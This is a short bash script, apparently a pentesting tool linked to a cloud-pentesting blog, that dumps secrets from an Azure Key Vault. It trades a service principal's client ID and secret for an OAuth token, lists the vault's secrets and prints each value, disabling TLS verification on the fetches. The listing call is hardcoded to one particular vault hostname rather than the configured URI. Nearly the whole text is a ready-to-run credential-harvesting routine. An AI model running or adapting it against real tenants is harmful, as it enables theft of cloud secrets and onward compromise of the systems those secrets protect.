#!/usr/bin/bash
# https://thecyberpunker.com/pentesting/pentesting-cloud-azure/
# Script to dump secrets from azure keyvault
# Author: 0xl3mon



# COLORS
readonly BLUE='\033[94m'
readonly  RED='\033[91m'
readonly  GREEN='\033[92m'
readonly  ORANGE='\033[93m'
readonly  RESET='\e[0m'

# CTRL + C
trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\n${ORANGE}Exiting...${RESET}"
    exit
}

# Global Variables
KEYVAULT_CLIENT_ID="ID"
KEYVAULT_CLIENT_KEY="KEY SECRET"
KEYVAULT_CLIENT_TENANT_ID="TENANT"
KEYVAULT_URI="https://VAULTURI.vault.azure.net/"


function get_jwt(){
	# Req
	jwt_raw=$(curl "https://login.microsoftonline.com/$KEYVAULT_CLIENT_TENANT_ID/oauth2/v2.0/token" --silent --data "grant_type=client_credentials&client_id=$KEYVAULT_CLIENT_ID&client_secret=$KEYVAULT_CLIENT_KEY&scope=https://vault.azure.net/.default" | jq '.access_token')
	echo -e "${ORANGE}[${RESET}${GREEN}+${RESET}${ORANGE}]${RESET}  Jwt Obtenido: $jwt_raw"
	jwt=$(echo $jwt_raw | tr -d '"')
}

function dumping_secrets(){
	echo -e "\n${ORANGE}[${RESET}${GREEN}+${RESET}${ORANGE}]${RESET} Listando Secretos del vault"
	sleep 0.2
	secrets=$(curl -X GET "https://az-kv-emd-use-dev.vault.azure.net/secrets?api-version=7.3" -H "Authorization: Bearer $jwt" --silent | jq ' .value[] | {id}[]' )
	printf "%s\n" "${secrets[@]}"

	echo -e "\n${ORANGE}[${RESET}${GREEN}+${GREEN}${ORANGE}]${RESET} Obteniendo secretos"
	for i in ${secrets[@]}; do
		url="$(echo $i | tr -d '"')?api-version=7.3"
		echo "-> $url"
		curl -X GET --silent "$url" -H "Authorization: Bearer $jwt" --insecure | jq '.value'
	done

}

get_jwt
sleep 0.5
dumping_secrets